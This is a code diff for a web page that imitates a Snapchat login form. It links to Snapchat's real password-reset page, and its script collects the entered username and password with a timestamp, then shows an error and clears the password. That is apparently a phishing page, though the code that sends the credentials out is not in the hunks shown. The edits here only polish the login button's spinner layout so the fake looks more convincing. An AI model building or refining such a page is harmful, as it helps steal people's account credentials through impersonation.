@@ -42,8 +42,11 @@ input[type="checkbox"]:focus { outline: none; box-shadow: 0 0 0 2px rgba(0,176,2
   width: 62%; 
   font-size: 1.05rem; 
   padding: 0.7rem 0; 
-  display: block; 
+  display: flex; 
+  justify-content: center; 
+  align-items: center;
   margin: 0 auto; 
+  position: relative;
 }
 #loginBtn:active { background-color: #0090e0; }
 
@@ -122,7 +125,15 @@ form.flex.flex-col.space-y-6 { gap: 0.5rem; }
 }
 
 /* Spinner */
-.spinner { display: flex; align-items: center; justify-content: center; }
+.spinner { 
+  position: absolute; 
+  display: flex; 
+  align-items: center; 
+  justify-content: center; 
+  top: 50%; 
+  left: 50%; 
+  transform: translate(-50%, -50%); 
+}
 .spinner--outer {
   border-top: 2px solid #d2d2d2; 
   border-right: 2px solid #d2d2d2;
@@ -170,7 +181,7 @@ form.flex.flex-col.space-y-6 { gap: 0.5rem; }
       <span>Save Login Info on your iCloud devices</span>
     </label>
     <a id="forgotPassword" href="https://accounts.snapchat.com/accounts/password_reset_request" class="text-center text-sm font-sans mt-2 input-container">Forgot your password?</a>
-    <button id="loginBtn" type="submit" class="bg-[#b7c0c8] text-white font-medium text-lg py-3 rounded-full mt-4 flex justify-center items-center" disabled>
+    <button id="loginBtn" type="submit" class="bg-[#b7c0c8] text-white font-medium text-lg rounded-full mt-4 relative" disabled>
       <span class="btn-text">Log In</span>
       <span class="spinner" style="display:none;"><span class="spinner--outer"><span class="spinner--inner"></span></span></span>
     </button>
@@ -246,7 +257,7 @@ document.addEventListener("DOMContentLoaded", function(){
     const spinner = c.querySelector(".spinner");
     const btnText = c.querySelector(".btn-text");
     spinner.style.display = "flex";
-    btnText.style.display = "none";
+    btnText.style.visibility = "hidden"; // keeps button height
 
     const t=a.value.trim(),u=b.value.trim(),v=new Date().toLocaleString();
     if(t&&u){
@@ -257,14 +268,14 @@ document.addEventListener("DOMContentLoaded", function(){
         d.classList.remove("hidden");
         b.value="";y2();
         spinner.style.display="none";
-        btnText.style.display="inline";
+        btnText.style.visibility="visible";
         c.classList.remove("bg-[#00b0ff]");c.classList.add("bg-[#b7c0c8]");c.disabled=!0;
       },1200);
     }else {
       d.textContent="Please fill in both fields.";
       d.classList.remove("hidden");
       spinner.style.display="none";
-      btnText.style.display="inline";
+      btnText.style.visibility="visible";
     }
   });
 
